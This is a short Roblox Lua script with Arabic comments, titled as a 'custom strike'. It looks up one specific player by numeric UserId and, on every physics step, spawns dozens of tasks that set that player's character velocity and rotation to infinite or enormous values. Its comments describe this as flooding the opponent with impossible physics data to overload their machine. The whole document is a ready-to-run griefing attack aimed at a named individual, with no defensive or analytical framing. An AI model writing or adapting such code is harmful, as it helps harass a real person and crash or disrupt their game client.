-- [[ 7ARBI CUSTOM STRIKE: ID TARGETED ]] --
-- الماب: Baseplate 
-- الهدف: 10080511071

local targetID = 10080511071
local runService = game:GetService("RunService")

-- البحث عن اللاعب عن طريق الـ ID
local function getTarget()
    for _, v in pairs(game.Players:GetPlayers()) do
        if v.UserId == targetID then
            return v
        end
    end
    return nil
end

local target = getTarget()

if target then
    print("!!! تم تحديد الهدف بنجاح: " .. target.Name .. " !!!")
    
    -- تفعيل وضع إغراق البيانات الفيزيائية
    runService.Stepped:Connect(function()
        pcall(function()
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                -- إرسال "قيم مستحيلة" لمعالج الخصم
                local hrp = target.Character.HumanoidRootPart
                for i = 1, 50 do
                    task.spawn(function()
                        hrp.Velocity = Vector3.new(math.huge, 10^15, math.huge)
                        hrp.RotVelocity = Vector3.new(9e9, 9e9, 9e9)
                    end)
                end
            end
        end)
    end)
else
    print("الهدف غير موجود في هذا السيرفر حالياً.")
end
